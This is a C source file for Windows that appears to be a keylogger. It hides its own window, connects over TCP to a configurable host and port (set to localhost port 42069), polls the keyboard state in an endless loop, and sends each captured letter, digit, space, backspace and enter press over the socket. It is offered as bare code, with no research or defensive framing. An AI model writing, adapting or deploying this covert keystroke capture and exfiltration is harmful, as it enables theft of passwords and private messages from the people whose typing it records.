#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <winsock.h>  
#include <conio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define PORT 42069
#define HOST "127.0.0.1"

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    LPTSTR buf = (LPTSTR)lParam;
    GetWindowTextA(hwnd, buf, 48);
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid == GetCurrentProcessId())  
    {
        ShowWindow(hwnd, SW_HIDE);
    }

    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
    LPTSTR buf;
    EnumWindows(&EnumWindowsProc, (LPARAM)buf);
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char c = 0, b;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {   
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 2;  
    }
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        WSACleanup();
        return 2;
    }
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    INPUT Event = {0};
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {   
        printf("Failed. Error Code : %d", WSAGetLastError());
        WSACleanup(); 
        closesocket(s);
        return 2;
    }
    while (1)
        for ( int i = 0x00 ; i<0xfe ; ++i )
            if ( GetKeyState(i) < 0 )
            { 
                fflush(stdout);
                SHORT key = i;
                UINT mappedKey = MapVirtualKey( LOBYTE( key ), 0 );
                Event.type = INPUT_KEYBOARD;
                Event.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
                Event.ki.wScan = mappedKey;
                if ( ( i > 0x2f && i < 0x4a ) || ( i > 0x40 && i < 0x5b ) || i == VK_SPACE || i == VK_BACK || i == VK_RETURN)
                {
                    SendInput( 1, &Event, sizeof( Event ) );
                    printf("%c", i);          
                    if ( i == VK_RETURN || i == VK_BACK) 
                    {
                        b = '\n';
                        printf("\n");
                    }
                    else b = (char)i;
                    if (send(s, &b, 1, 0) == -1)
                        return 0;
                }
            }
}
    

    
    
